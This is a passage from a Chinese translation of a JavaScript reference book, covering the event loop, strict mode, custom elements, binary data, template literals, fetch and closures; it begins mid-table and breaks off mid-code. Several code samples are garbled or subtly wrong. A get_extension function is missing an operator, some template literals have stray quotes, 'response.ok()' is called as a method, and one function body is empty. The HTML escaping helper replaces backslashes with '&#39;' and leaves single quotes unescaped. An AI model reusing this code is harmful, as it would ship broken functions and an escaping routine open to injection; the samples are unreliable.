  \ 按钮和取消按钮的对话框 |\n| `window.getComputedStyle()` | 获取应用到元素上的 CSS 样式 |\n| `window.moveTo(x,y)`\
  \ | 将窗口的左边缘和上边缘移动到指定的坐标 |\n| `window.open()` | 打开一个新的浏览器窗口，并将 URL 作为参数 |\n| `window.print()`\
  \ | 浏览器用户想要打印当前页面的内容 |\n| `window.prompt()` | 创建一个用于获取用户输入的对话框 |\n| `window.scrollBy()`\
  \ | 按指定的像素数滚动文档 |\n| `window.scrollTo()` | 滚动到指定的坐标 |\n| `window.setInterval()`\
  \ | 在指定的间隔重复执行某些操作 |\n| `window.setTimeout()` | 在指定的时间后执行某些操作 |\n| `window.stop()`\
  \ | 停止窗口加载 |\n\n### 章节 49: 事件循环 (Event Loop)\n\n#### 章节 49.1: 浏览器中的事件循环\n\n绝大多数现代\
  \ JavaScript 环境都根据*事件循环*工作。这是一个编程中的常见概念，本质上意味着你的程序不断等待新事件的发生，并在发生时做出反应。宿主环境*会调用你的程序，产生“轮询”或“节”或“任务”，然后*运行完成*。\n\
  \n在所有这些开始之前，宿主环境会等待某些事情发生。\n\n在浏览器中有一个简单的示例。考虑以下示例：\n\n```html\n<!DOCTYPE html>\n\
  <title>事件循环示例</title>\n<script>\nconsole.log(\"这是脚本入口点\");\ndocument.body.onclick\
  \ = () => {\n  console.log(\"onclick\");\n};\nsetTimeout(() => {\n  console.log(\"\
  setTimeout 回 1\");\n  console.log(\"setTimeout 回 2\");\n}, 100);\n</script>\n```\n\
  \n在这个示例中，宿主环境是 浏览器。\n\n1. HTML 解析器首先执行 `<script>`。它将运行完成。\n2. `setTimeout` 调用告诉浏览器在\
  \ 100 毫秒后，应该队列一个任务来执行给定的。\n3. 与此同时，事件循环负责不断检查是否有其他事情要做：例如，渲染网页。\n4. 100 毫秒后，如果事件循环没有因为其他原因而忙，它将看到\
  \ `setTimeout` 队列的任务并运行该函数，打印那两个语句。\n5. 在任何时候，如果有人点击了 body，浏览器将向事件循环发布一个任务来运行点击处理函数。事件循环在它循环运行检查要做什么时，会看到这一点并运行该函数。\n\
  \n你可以看到在这个示例中存在几种不同类型的 JavaScript 代码入口点，事件循环会调用它们：\n\n- `<script>` 元素立即调用\n- `setTimeout`\
  \ 任务被发布到事件循环并运行一次\n- 点击处理任务可以发布多次，并在每次运行时运行\n\n事件循环的每一轮都负责许多事情；只有其中一部分会调用这些 JavaScript\
  \ 任务。有关完整详细信息，请参阅 HTML 规范\n\n\n\n\n\n最后一点：我们所说的每个事件循环任务都会“运行到完成”是什么意思？我们的意思是，通常无法中断一个被排队作为任务执行的代码块，而且永远无法与另一个代码块交替运行。例如，即使你在完美的时间点进行点击，你也永远无法让上述代码在两个\
  \ `setTimeout` 回调日志 1/2 秒之间打印 \"onclick\"。这是由于任务投递（task posting）的工作机制；它是协作且基于队列的，而不是抢占式的。\n\
  \n## 第 49.2 节：异步操作与事件循环\n\n在常见的 JavaScript 环境中，许多有趣的操作都是异步的。例如，在浏览器中我们看到这样的：\n\n\
  ```javascript\nwindow.setTimeout(() => {\n  console.log(\"this happens later\");\n\
  }, 100);\n```\n\n在 Node.js 中我们看到这样的：\n\n```javascript\nfs.readFile(\"file.txt\"\
  , (err, data) => { \n  console.log(\"data\");\n});\n```\n\n这是如何与事件循环配合的呢？\n\n其工作原理是，当这些语句执行时，它们告诉*宿主环境*（即浏览器或\
  \ Node.js 运行时）去执行某些操作，可能在另一个线程中。当宿主环境完成该操作后（分别等待 100 毫秒或读取文件 `file.txt`），它将向事件循环投递一个任务，并说：“使用我之前给出的这些参数调用回调函数”。\n\
  \n随后，事件循环忙于处理它的工作：渲染网页、监听用户输入，并不断寻找投递的任务。当它看到这些调用回调的投递任务时，它会回调 JavaScript。这就是你获得异步行为的方式！\n\
  \n## 第 50 章：严格模式\n\n### 第 50.1 节：针对整个脚本\n\n可以通过在任何其他语句之前放置 `\"use strict\";` 语句将严格模式应用于整个脚本。\n\
  \n```javascript\n\"use strict\";\n// 严格模式现在适用于脚本的剩余部分\n```\n\n严格模式仅在定义了 `\"use strict\"\
  ` 的脚本中启用。你可以将带有和不带严格模式的脚本组合在一起，因为严格状态不会在不同的脚本之间共享。\n\n版本 ≥ 6\n\n**注意：** 所有在 ES2015+\
  \ 模块和类内部编写的代码默认都是严格模式。\n\n### 第 50.2 节：针对函数\n\n严格模式也可以通过在函数声明开头添加 `\"use strict\"\
  ;` 语句应用于单个函数。\n\n```javascript\nfunction strict() {\n  \"use strict\";\n  // 严格模式现在适用于该函数的剩余部分\n\
  \  var innerFunction = function () {\n    // 严格模式也适用于这里\n  };\n}\n\nfunction notStrict()\
  \ { // 但这里不适用\n}\n```\n\n严格模式也会适用于任何内部作用域的函数。\n\n### 第 50.3 节：对属性的更改\n\n严格模式还防止你删除不可删除的属性。\n\
  \n```javascript\n\"use strict\";\ndelete Object.prototype; // 抛出 TypeError\n```\n\
  \n如果你不使用严格模式，上面的语句将被简单忽略，但现在你知道为什么它没有按照预期执行了。\n\n它还防止你扩展一个不可扩展的属性。\n\n```javascript\n\
  var myObject = {name: \"My Name\"}; \nObject.preventExtensions(myObject);\n\nfunction\
  \ setAge() {\n  myObject.age = 25; // 无错误\n}\n\nfunction setAge() {\n  \"use strict\"\
  ;\n  myObject.age = 25; // TypeError: can't define property \"age\": Object is not\
  \ extensible\n}\n```\n\n### 第 50.4 节：对全局属性的更改\n\n在非严格模式作用域中，当变量赋值没有使用 `var`、`const`\
  \ 或 `let` 关键字初始化时，它会自动在全局作用域中声明：\n\n```javascript\na = 12;\nconsole.log(a); // 12\n\
  ```\n\n但在严格模式下，对未声明变量的任何访问都会抛出引用错误（reference error）：\n\n```javascript\n\"use strict\"\
  ;\na = 12; // ReferenceError: a is not defined \nconsole.log(a);\n```\n\n这是很有用的，因为\
  \ JavaScript 有许多有时意之外的可能事件。在非严格模式下，这些事件经常让开发者认为是 bug 或意外行为，因此通过启用严格模式，任何抛出的错误都会强制他们确切知道正在执行什么。\n\
  \n```javascript\n\"use strict\"; // 假设存在一个写错误的全局变量 mistypedVariable\nmistypedVaraible\
  \ = 17; // 这一行由于变量拼写错误而抛出 ReferenceError\n```\n\n这段代码在严格模式下显示了一种可能的情况：它抛出一个引用错误并指向赋值所在的行号，允许开发者立即检测到变量名中的拼写错误。\n\
  \n在非严格模式下，除了没有抛出错误且赋值成功外，拼写错误的 `mistypedVaraible` 将自动在全局作用域中声明为全局变量。这意味着开发者需要手动在代码中查找这一特定的赋值。\n\
  \n此外，通过强制声明变量，开发者不会意外在函数内部声明全局变量。在非严格模式下：\n\n```javascript\nfunction foo() {\n \
  \ a = \"bar\"; // 自动在全局作用域中声明\n}\nfoo();\nconsole.log(a); // >> bar\n```\n\n在严格模式下，必须显式声明变量：\n\
  \n```javascript\nfunction strict_scope() {\n  \"use strict\";\n  var a = \"bar\"\
  ; // 变量是局部的\n}\nstrict_scope();\nconsole.log(a); // >> \"ReferenceError: a is not\
  \ defined\"\n```\n\n变量也可以在函数外部之后声明，允许它在（例如）全局作用域中使用：\n\n```javascript\nfunction\
  \ strict_scope() {\n  \"use strict\";\n  a = \"bar\"; // 变量是全局的\n}\nvar a;\nstrict_scope();\n\
  console.log(a); // >> bar\n```\n\n### 第 50.5 节：重复参数\n\n严格模式不允许使用重复的函数参数名。\n\n```javascript\n\
  function foo(bar, bar) {} // 无错误。调用时 bar 被设置为最后一个参数\n\n\"use strict\";\nfunction\
  \ foo(bar, bar) {}; // SyntaxError: duplicate formal argument bar\n```\n\n### 第\
  \ 50.6 节：严格模式下的函数作用域\n\n在严格模式下，在局部块中声明的函数在块外部是不可访问的。\n\n```javascript\n\"use strict\"\
  ;\n{\n  f(); // 'hi'\n  function f() {console.log('hi');}\n}\nf(); // ReferenceError:\
  \ f is not defined\n```\n\n从作用域来说，严格模式下的函数声明与 `let` 或 `const` 具有相同的绑定类型。\n\n###\
  \ 第 50.7 节：函数参数列表的行为\n\n`arguments` 对象在*严格*和*非严格*模式下的行为不同。在*非严格*模式下，参数对象会反映已存在参数值的变化，但在*严格*模式下，对参数值的任何更改都不会反映在\
  \ `arguments` 对象中。\n\n```javascript\nfunction add(a, b){\n  console.log(arguments[0],\
  \ arguments[1]); // 输出： 1,2\n  a = 5, b = 10;\n  console.log(arguments[0], arguments[1]);\
  \ // 输出： 5,10\n}\nadd(1, 2);\n```\n\n对于上述代码，当我们更改参数值时，`arguments` 对象发生了变化。但对于*严格*模式，这种变化不会被反映。\n\
  \n```javascript\nfunction add(a, b) { \n  'use strict';\n  console.log(arguments[0],\
  \ arguments[1]); // 输出： 1,2\n  a = 5, b = 10;\n  console.log(arguments[0], arguments[1]);\
  \ // 输出： 1,2\n}\n```\n\n值得注意的是，如果任何参数为 `undefined`，无论在*严格模式*还是*非严格模式*下，当我们尝试更改参数的值时，`arguments`\
  \ 对象都保持不变。\n\n```javascript\n// 严格模式\nfunction add(a, b) { \n  'use strict';\n \
  \ console.log(arguments[0], arguments[1]); // 输出： undefined,undefined\n  a = 5,\
  \ b = 10;\n  console.log(arguments[0], arguments[1]); // 输出： undefined,undefined\n\
  }\nadd();\n\n// 非严格模式\nfunction add(a,b) {\n  console.log(arguments[0],arguments[1]);\n\
  \  a = 5, b = 10;\n  console.log(arguments[0],arguments[1]); \n}\nadd();\n```\n\n\
  ### 第 50.8 节：非简单参数列表\n\n```javascript\nfunction a(x = 5) {\n  \"use strict\";\n\
  }\n```\n\n\n\n\n这是无效的 JavaScript，并将抛出 `SyntaxError`，因为你不能在具有非简单参数列表（如上所示）的函数中使用\
  \ `\"use strict\"` 指令——例如默认赋值 `x = 5`。\n\n非简单参数包括：\n\n- 默认赋值\n  ```javascript\n\
  \  function a(x = 1) { \"use strict\";\n  ```\n- 解构赋值\n  ```javascript\n  function\
  \ a({ x }) { \"use strict\"; }\n  ```\n- 剩余参数 (Rest params)\n  ```javascript\n \
  \ function a(...args) { \"use strict\"; }\n  ```\n\n# 第 51 章：自定义元素\n\n## 参数详情\n\n\
  - `name`: 新的自定义元素的名称。\n- `options.extends`: 被扩展的原生元素名称，如果有。\n- `options.prototype`:\
  \ 自定义元素使用的原型，如果有。\n\n## 第 51.1 节：扩展原生元素\n\n扩展原生元素是可能的，但它们的后代无法拥有自己的标签名称。相反，使用 `is`\
  \ 属性来指定元素应该使用哪个子类。例如，这里是对 `<img>` 元素的扩展，它在加载时会在控制台打印一条消息。\n\n```javascript\nconst\
  \ prototype = Object.create(HTMLImageElement.prototype);\nprototype.createdCallback\
  \ = function() {\n  this.addEventListener('load', event => {\n    console.log(\"\
  Image loaded successfully.\");\n  });\n};\ndocument.registerElement('ex-image',\
  \ { extends: 'img', prototype: prototype });\n```\n`<img is=\"ex-image\" src=\"\
  http://cdn.sstatic.net/Sites/stackoverflow/img/apple-touch-icon.png\" />`\n\n##\
  \ 第 51.2 节：注册新元素\n\n定义一个 `<initially-hidden>` 自定义元素，它会隐藏内容，直到指定的秒数通过。\n\n```javascript\n\
  const InitiallyHiddenElement = document.registerElement('initially-hidden', class\
  \ extends HTMLElement {\n  createdCallback() {\n    this.revealTimeoutId = null;\n\
  \  }\n  attachedCallback () {\n    const seconds = Number(this.getAttribute('for'));\n\
  \    this.style.display = 'none';\n    this.revealTimeoutId = setTimeout(() => {\n\
  \      this.style.display = 'block';\n    }, seconds * 1000);\n  }\n  detachedCallback\
  \ () {\n    if (this.revealTimeoutId) {\n      clearTimeout(this.revealTimeoutId);\n\
  \      this.revealTimeoutId = null;\n    }\n  }\n});\n```\n`<initially-hidden for=\"\
  2\">Hello</initially-hidden> <initially-hidden for=\"5\">World</initially-hidden>`\n\
  \n# 第 52 章：数据操作\n\n## 第 52.1 节：将数字格式化为货币\n\n将 `Number` 类型的值格式化为货币的快速方法，例如 `1234567.89\
  \ => \"1,234,567.89\"`：\n\n```javascript\nvar num = 1234567.89,\nformatted;\nformatted\
  \ = num.toFixed(2).replace(/\\d(?=(\\d{3})+\\.)/g, '$&,'); // \"1,234,567.89\"\n\
  ```\n\n更高级的变体支持任意数量的小数 `[0 .. n]`、可变数字组大小 `[0 .. x]` 以及不同的分隔符类型：\n\n```javascript\n\
  /**\n * Number.prototype.format(n, x, s, c)\n * @param integer n: 小数长度\n * @param\
  \ integer x: 整数部分长度\n * @param mixed s: 节分隔符\n * @param mixed c: 小数分隔符\n */\nNumber.prototype.format\
  \ = function(n, x, s, c) {\n  var re = '\\\\d(?=(\\\\d{' + (x || 3) + '})+' + (n\
  \ > 0 ? '\\\\D' : '$') + ')',\n  num = this.toFixed(Math.max(0, ~~n));\n  return\
  \ (c ? num.replace('.', c) : num).replace(new RegExp(re, 'g'), '$&' + (s || ','));\n\
  };\n```\n\n```javascript\n12345678.9.format(2, 3, '.', ','); // \"12.345.678,90\"\
  \n123456.789.format(4, 4, ' ', ':'); // \"12 3456:7890\"\n12345678.9.format(0, 3,\
  \ '-'); // \"12-345-679\"\n123456789.format(2); // \"123,456,789.00\"\n```\n\n##\
  \ 第 52.2 节：从文件名提取扩展名\n\n在 JavaScript 中从文件名提取扩展名的快速方法是：\n\n```javascript\nfunction\
  \ get_extension(filename) {\n  return filename.slice((filename.lastIndexOf('.')\
  \ 1 >>> 0) + 2);\n}\n```\n\n它对于没有扩展名的名称（例如 `myfile`）或以点开头的名称（例如 `.htaccess`）都能正常工作：\n\
  \n```javascript\nget_extension(''); // \"\"\nget_extension('name') // \"\"\nget_extension('name.txt')\
  \ // \"txt\"\nget_extension('.htpasswd') // \"\"\nget_extension('name.with.many.dots.myext')\
  \ // \"myext\"\n```\n\n以下解决方案可以从完整路径中提取文件扩展名：\n\n```javascript\nfunction get_extension(path)\
  \ {\n  // 从完整路径中提取扩展名的逻辑\n}\n```\n\n# 第 53 章：二进制数据\n\n## 第 53.1 节：获取二进制表示\n\n现在我们使用\
  \ `DataView` 将文件实际转换为 1 和 0：\n\n```javascript\nfunction ArrayBufferBinary(buffer)\
  \ {\n  var dataView = new DataView(buffer);\n  var response = \"\", offset = (8/8);\n\
  \  for (var i = 0; i < dataView.byteLength; i += offset) {\n    response += dataView.getInt8(i).toString(2);\n\
  \  }\n  return response;\n}\n```\n\n文件是以字节形式保存的。“魔术”偏移量值通过注意到我们正在将文件视为 8 位整数而获得。如果我们尝试将按字节保存的（即\
  \ 8 位）文件读取为 32 位整数，我们会注意到 32/8 = 4 是字节空间的数量，这就是我们的字节值。\n\n对于此任务，`DataViews` 是大材小用用。它们通常用于遇到字节序或数据异构性的情况（例如读取\
  \ PDF 文件，其头文件以不同的基编码，我们希望有意义地提取该值）。因为我们只想要文本表示，我们不关心异构性，因为永远不会有一个...\n\n一个更好且更短的解决方案可以使用\
  \ `Uint8Array` 类型数组来找到，它将整个 `ArrayBuffer` 视为由无符号 8 位整数组成：\n\n```javascript\nfunction\
  \ ArrayBufferToBinary(buffer) {\n  var uint8 = new Uint8Array(buffer);\n  return\
  \ uint8.reduce((binary, uint8) => binary + uint8.toString(2), \"\");\n}\n```\n\n\
  ## 第 53.2 节：在 Blob 和 ArrayBuffer 之间转换\n\nJavaScript 在浏览器中表示二进制数据有两种主要方式。ArrayBuffers/TypedArrays\
  \ 包含可变的（尽管仍是固定长度）二进制数据，你可以直接操作它。Blobs 包含不可变的二进制数据，只能通过异步 File 接口访问。**将 Blob 转换为\
  \ ArrayBuffer（异步）**\n\n```javascript\nvar blob = new Blob([\"\\x01\\x02\\x03\\x04\"\
  ]), fileReader = new FileReader();\nfileReader.onload = function() {\n  array =\
  \ this.result;\n};\n```\n\n\n\n\n```javascript\nconsole.log(\"Array contains\",\
  \ array.byteLength, \"bytes.\");\n};\n```\n\n## 版本 ≥ 6\n\n## 使用 Promise 将 Blob 转换为\
  \ ArrayBuffer（异步）\n\n```javascript\nvar blob = new Blob([\"\\x01\\x02\\x03\\x04\"\
  ]);\n\nvar arrayPromise = new Promise(function(resolve) {\n  var reader = new FileReader();\n\
  \n  reader.onloadend = function() { \n    resolve(reader.result);\n  };\n\n  reader.readAsArrayBuffer(blob);\
  \ \n});\n\narrayPromise.then(function(array) {\n  console.log(\"Array contains\"\
  , array.byteLength, \"bytes.\");\n});\n```\n\n## 将 ArrayBuffer 或类型数组转换为 Blob\n\n\
  ```javascript\nvar array = new Uint8Array([0x04, 0x06, 0x07, 0x08]); \nvar blob\
  \ = new Blob([array]);\n```\n\n### 章节 53.3：使用 DataViews 操作 ArrayBuffers\n\nDataViews\
  \ 提供了从 `ArrayBuffer` 中读取和写入单个值的方法，而不是将整个内容视为单类型的数组。在这里，我们逐个设置两个字节，然后将它们共同解释为 16\
  \ 位无符号整数，首先使用大端序，然后使用小端序。\n\n```javascript\nvar buffer = new ArrayBuffer(2); \n\
  var view = new DataView(buffer);\n\nview.setUint8(0, 0xFF); \nview.setUint8(1, 0x01);\n\
  \nconsole.log(view.getUint16(0, false)); // 65281 \nconsole.log(view.getUint16(0,\
  \ true)); // 511\n```\n\n### 章节 53.4：从 Base64 字符串创建 TypedArray\n\n```javascript\n\
  var data =\n  'iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACN' +\n  'byblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHx'\
  \ +\n  'gljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==';\n\nvar characters = atob(data);\n\
  var array = new Uint8Array(characters.length);\n\nfor (var i = 0; i < characters.length;\
  \ i++) {\n  array[i] = characters.charCodeAt(i);\n}\n```\n\n### 章节 53.5：使用 TypedArrays\n\
  \nTypedArrays 是一组类型，为固定长度的可变 `ArrayBuffers` 提供了不同的视图。在大多数情况下，它们的作用类似于 `Arrays`，会将所有赋值的值强制转换为给定的数值类型。你可以将\
  \ `ArrayBuffer` 实例传递给 `TypedArray` 构造函数，以创建其数据的新视图。\n\n```javascript\nvar buffer\
  \ = new ArrayBuffer(8);\n\nvar byteView = new Uint8Array(buffer); \nvar floatView\
  \ = new Float64Array(buffer);\n\nconsole.log(byteView); // [0, 0, 0, 0, 0, 0, 0,\
  \ 0] \nconsole.log(floatView); // [0]\nbyteView[0] = 0x01;\nbyteView[1] = 0x02;\n\
  byteView[2] = 0x04;\nbyteView[3] = 0x08;\n\nconsole.log(floatView); // [6.64421383e-316]\n\
  ```\n\n`ArrayBuffers` 可以使用 `.slice(...)` 方法进行拷贝，可以直接拷贝，也可以通过 `TypedArray` 视图拷贝。\n\
  \n```javascript\nvar byteView2 = byteView.slice();\n\nvar floatView2 = new Float64Array(byteView2.buffer);\
  \ \nbyteView2[6] = 0xFF;\n\nconsole.log(floatView); // [6.64421383e-316] \nconsole.log(floatView2);\
  \ // [7.06327456e-304]\n```\n\n### 章节 53.6：遍历 arrayBuffer\n\n为了方便遍历 `arrayBuffer`，你可以创建一个简单的迭代器，它在底层实现了\
  \ `DataView` 方法：\n\n```javascript\nvar ArrayBufferCursor = function() {\n  var ArrayBufferCursor\
  \ = function(arrayBuffer) {\n    this.dataview = new DataView(arrayBuffer, 0); \n\
  \    this.size = arrayBuffer.byteLength;\n    this.index = 0;\n  }\n\n  ArrayBufferCursor.prototype.next\
  \ = function(type) {\n    switch (type) {\n      case 'Uint8':\n        var result\
  \ = this.dataview.getUint8(this.index); \n        this.index += 1;\n        return\
  \ result;\n      case 'Int16':\n        var result = this.dataview.getInt16(this.index,\
  \ true); \n        this.index += 2;\n        return result;\n      case 'Uint16':\n\
  \        var result = this.dataview.getUint16(this.index, true); \n        this.index\
  \ += 2;\n        return result;\n      case 'Int32':\n        var result = this.dataview.getInt32(this.index,\
  \ true); \n        this.index += 4;\n        return result;\n      case 'Uint32':\n\
  \        var result = this.dataview.getUint32(this.index, true); \n        this.index\
  \ += 4;\n        return result;\n      case 'Float':\n      case 'Float32':\n  \
  \      var result = this.dataview.getFloat32(this.index, true);\n        this.index\
  \ += 4;\n        return result;\n      case 'Double':\n      case 'Float64':\n \
  \       var result = this.dataview.getFloat64(this.index, true);\n        this.index\
  \ += 8;\n        return result;\n      default:\n        throw new Error(\"Unknown\
  \ datatype\");\n    }\n  };\n\n  ArrayBufferCursor.prototype.hasNext = function()\
  \ { \n    return this.index < this.size;\n  }\n\n  return ArrayBufferCursor; \n\
  });\n```\n\n你可以像这样创建一个迭代器：\n\n```javascript\nvar cursor = new ArrayBufferCursor(arrayBuffer);\n\
  \n你可以使用 `hasNext` 来检查是否还有项\nfor (;cursor.hasNext();) {\n  // 还有待处理的项\n}\n```\n\n\
  你可以使用 `next` 方法获取下一个值：\n\n```javascript\nvar nextValue = cursor.next('Float');\n\
  ```\n\n有了了这样的迭代器，编写自己的解析器来处理二进制数据就变得非常简单了。\n\n## 第 54 章：模板字面量\n\n模板字面量是字符串字面量的一种，允许进行插值，并且可选可以使用“标签”函数控制插值和构造行为。\n\
  \n### 章节 54.1：基础插值和多行字符串\n\n模板字面量是一种特殊的字符串字面量类型，可以代替标准的 `'...'` 或 \"...\"。它们通过使用反引号\
  \ `...` 而不是标准的单引号或双引号来声明字符串。\n\n模板字面量可以包含换行符，并可以使用 `${ expression }` 替换语法嵌入任意表达式。默认情况下，这些插值表达式的值将直接连接到它们所在位置的字符串中。\n\
  \n```javascript\nconst name = \"John\";\nconst score = 74;\nconsole.log(`Game Over!\n\
  ${name}'s score was ${score * 10}.`);\n```\n\n### 章节 54.2：标签字符串\n\n紧跟在模板字面量之前的函数被用于解释它，这被称为“标签模板字面量（tagged\
  \ template literal）”。标签函数可以返回字符串，也可以返回任何类型的值。\n\n标签函数的第一个参数 `strings` 是该字面量中每个常量部分的\
  \ `Array`。剩余参数 `...substitutions` 包含了每个 `${}` 表达式的求值后的结果。\n\n```javascript\nfunction\
  \ settings(strings, ...substitutions) {\n  const result = new Map();\n  for (let\
  \ i = 0; i < substitutions.length; i++) {\n    result.set(strings[i].trim(), substitutions[i]);\n\
  \  }\n  return result;\n}\n\nconst remoteConfiguration = settings`\nlabel ${Content'}\n\
  servers ${2 * 8 + 1}\nhostname ${location.hostname}\n`;\n```\n\n`strings` 数组有一个特殊的\
  \ `.raw` 属性，引用一个平行的数组，该数组包含字面量的相同的常量部分，但是*完全*按照它们在源代码中出现的形式，不替换任何反斜杠转义。\n\n```javascript\n\
  function example(strings, ...substitutions) {\n  console.log('strings:', strings);\n\
  \  console.log('...substitutions:', substitutions);\n}\n\nexample`Hello ${world'}.\\\
  n\\nHow are you?`;\n```\n\n### 章节 54.3：原始字符串\n\n`String.raw` 标签函数可以配合模板字面量使用，以访问不解释任何反斜杠转义序列的内容版本。\n\
  \n`String.raw`\\n`` 将包含一个反斜杠和一个小字母 n，而 `\\n` 或 `'\\n'` 则包含一个单个换行符。\n\n```javascript\n\
  const patternString = String.raw`Welcome, (\\w+)!`;\nconst pattern = new RegExp(patternString);\n\
  const message = \"Welcome, John!\";\npattern.exec(message);\n```\n\n### 章节 54.4：使用模板字符串构建\
  \ HTML\n\n你可以创建一个 `HTML...` 模板字符串标签函数来自动对插值进行编码。（这要求插值仅被作为文本使用，并且**如果插值被用于脚本或样式等代码中则可能不安全**。）\n\
  \n\n\n\n\n```javascript\nclass HTMLString extends String {\n  static escape(text)\
  \ {\n    if (text instanceof HTMLString) {\n      return text;\n    }\n    return\
  \ new HTMLString(\n      String(text)\n        .replace(/&/g, '&amp;')\n       \
  \ .replace(/</g, '&lt;')\n        .replace(/>/g, '&gt;')\n        .replace(/\"/g,\
  \ '&quot;')\n        .replace(/\\\\/g, '&#39;')\n    );\n  }\n}\n\nfunction HTML(strings,\
  \ ...substitutions) {\n  const escapedFlattenedSubstitutions =\n    substitutions.map(s\
  \ => [].concat(s).map(HTMLString.escape).join(''));\n  const pieces = [];\n  for\
  \ (const i of strings.keys()) {\n    pieces.push(strings[i], escapedFlattenedSubstitutions[i]\
  \ || '');\n  }\n  return new HTMLString(pieces.join(''));\n}\n```\n\n`const title\
  \ = \"Hello World\";`\n`const iconSrc = \"/images/logo.png\";`\n`const names = [\"\
  John\", \"Jane\", \"Joe\", \"Jill\"];`\n\n`document.body.innerHTML = HTML`\n<h1><img\
  \ src=\"${iconSrc}\" /> ${title}</h1>\n<ul> ${names.map(name => HTML`<li>${name}</li>`)}\
  \ </ul>\n`;`\n\n## 第 54.5 节：简介\n\n模板字符串字量（Template Literals）类似于具有特殊功能的字符串。它们被反引号\
  \ ` `` ` 包围，并且可以跨行。\n\n模板字符串字量还可以包含嵌入的表达式。这些表达式通过 `$` 符号和大括号 `{}` 来标识。\n\n`////单行模板字符串字量`\n\
  \n`var aLiteral = \\`single line string data\\`;`\n\n`// 跨行的模板字符串字量 var anotherLiteral\
  \ = \\`string data that spans across multiple lines of code\\`;`\n\n`// 带有嵌入表达式的模板字符串字量`\n\
  \n`var x = 2;`\n`var y = 3;`\n`var theTotal = \\`The total is ${x + y}\\`; // 包含\
  \ \"The total is 5\"`\n\n`// 字符串与模板字符串字量的比较`\n\n`var aString = \"single line string\
  \ data\"`\n`console.log(aString === aLiteral) // 返回 true`\n\n字符串字量还有许多其他特性，例如标签模板字符串字量（Tagged\
  \ Template Literals）和 `raw` 属性。这些特性将在其他示例中演示。\n\n## 第 55 章：Fetch\n\n### Options\
  \ 方法\n\n- `headers`: 一个 `Headers` 对象，包含包含在请求中的额外 HTTP 请求头。\n- `body`: 请求负载（payload），可以是字符串或\
  \ `FormData` 对象。默认值为 `undefined`。\n- `cache`: 缓存模式。`default`、`reload`、`no-cache`。\n\
  - `referrer`: 请求的引用来源（referrer）。\n- `mode`: `cors`、`no-cors`、`same-origin`。默认为 `no-cors`。\n\
  - `credentials`: `omit`、`same-origin`、`include`。默认为 `omit`。\n- `redirect`: `follow`、`error`、`manual`。默认为\
  \ `follow`。\n- `integrity`: 关联的完整性元数据。默认为空字符串。\n- `method`: 用于请求的 HTTP 方法。例如：`GET`、`POST`、`PUT`、`DELETE`、`HEAD`。默认为\
  \ `GET`。\n\n## 第 55.1 节：获取 JSON 数据\n\n```javascript\n// 从 stackoverflow 获取一些数据\n\
  fetch(\"https://api.stackexchange.com/2.2/questions/featured?order=desc&sort=activity&site=stackoverflow\"\
  )\n  .then(resp => resp.json())\n  .then(json => console.log(json))\n  .catch(err\
  \ => console.log(err));\n```\n\n## 第 55.2 节：设置请求头\n\n```javascript\nfetch('/example.json',\
  \ {\n  headers: new Headers({\n    'Accept': 'text/plain',\n    'X-Your-Custom-Header':\
  \ 'example value'\n  })\n});\n```\n\n## 第 55.3 节：POST 数据\n\n### 提交表单数据\n```javascript\n\
  fetch(`/example/submit`, {\n  method: 'POST',\n  body: new FormData(document.getElementById('example-form'))\n\
  });\n```\n\n### 提交 JSON 数据\n```javascript\nfetch(`/example/submit.json`, {\n  method:\
  \ 'POST',\n  body: JSON.stringify({\n    email: document.getElementById('example-email').value,\n\
  \    comment: document.getElementById('example-comment').value\n  })\n});\n```\n\
  \n## 第 55.4 节：发送 cookie\n\n`fetch` 函数默认不发送 cookie。发送 cookie 共有两种可能的方法：\n\n1. 仅当\
  \ URL 与调用脚本处于同源时才发送 cookie。\n```javascript\nfetch('/login', {\n  credentials: 'same-origin'\n\
  })\n```\n\n2. 始终发送 cookie，即使是跨源调用。\n```javascript\nfetch('https://otherdomain.com/login',\
  \ { credentials: 'include' })\n```\n\n## 第 55.5 节：GlobalFetch\n\n`GlobalFetch` 接口暴露了\
  \ `fetch` 函数，可以使用它可以请求资源。\n\n```javascript\nfetch('/path/to/resource.json')\n  .then(response\
  \ => {\n    if (!response.ok()) {\n      throw new Error(\"Request failed!\")\n\
  \    }\n    return response.json();\n  })\n  .then(json => {\n    console.log(json);\n\
  \  });\n```\n\n解析的值是一个 `Response` 对象。该 `Object` 包含响应体，以及它的状态和标头。\n\n## 第 55.6 节：使用\
  \ Fetch 从 Stack Overflow API 显示问题\n\n```javascript\nconst url = 'http://api.stackexchange.com/2.2/questions?site=stackoverflow&tagged=javascript';\n\
  const questionList = document.createElement('ul');\ndocument.body.appendChild(questionList);\n\
  const responseData = fetch(url).then(response => response.json());\nresponseData.then(({items,\
  \ has_more, quota_max, quota_remaining}) => {\n  for (const {title, score, owner,\
  \ link, answer_count} of items) {\n    const listItem = document.createElement('li');\n\
  \    questionList.appendChild(listItem);\n    const a = document.createElement('a');\n\
  \    listItem.appendChild(a);\n    a.href = link;\n    a.textContent = `[${score}]\
  \ ${title} (by ${owner.display_name || 'somebody'})`\n  }\n});\n```\n\n## 第 56 章：作用域\n\
  \n### 第 56.1 节：闭包\n\n当函数被声明时，其*声明*上下文中的变量会被捕获到它的作用域中。例如，在下面的代码中，变量 `x` 被绑定到外部作用域中的值，然后\
  \ `x` 的引用在 `bar` 的上下被捕获：\n\n```javascript\nvar x = 4; // 外部作用域中的声明\nfunction bar()\
  \ {\n  console.log(x); // 声明时捕获外部作用域\n}\nbar(); // 在控制台打印 4\n```\n示例输出：4\n\n这种“捕获”作用域的概念非常有趣，因为在外部作用域退出后，我们可以使用并修改来自外部作用域的变量。例如，考虑以下内容：\n\
  \n```javascript\nfunction foo() {\n  var x = 4; // 外部作用域中的声明\n  function bar() {\n\
  \    console.log(x); // 声明时捕获外部作用域\n  }\n  return bar;\n // foo 返回后 x 移出了作用域\n}\n\
  var barWithX = foo();\nbarWithX(); // 我们仍然可以访问 x\n```\n示例输出：4\n\n在上面的示例中，当调用 `foo`\
  \ 时，它的上下文被捕获在函数 `bar` 中。即使在 `foo` 返回后，`bar` 仍然可以访问并修改 `x`。这种捕获上下文的函数 `foo`被称为*闭包*。\n\
  \n### 私有数据\n\n这让我们能够做一些有趣的事情，例如定义仅对特定函数或一组函数可见的“私有”变量。一个人为但流行的例子：\n\n```javascript\n\
  function makeCounter() {\n  var counter = 0;\n  return {\n    value: function ()\
  \ { return counter; },\n    increment: function () { counter++; }\n  };\n}\nvar\
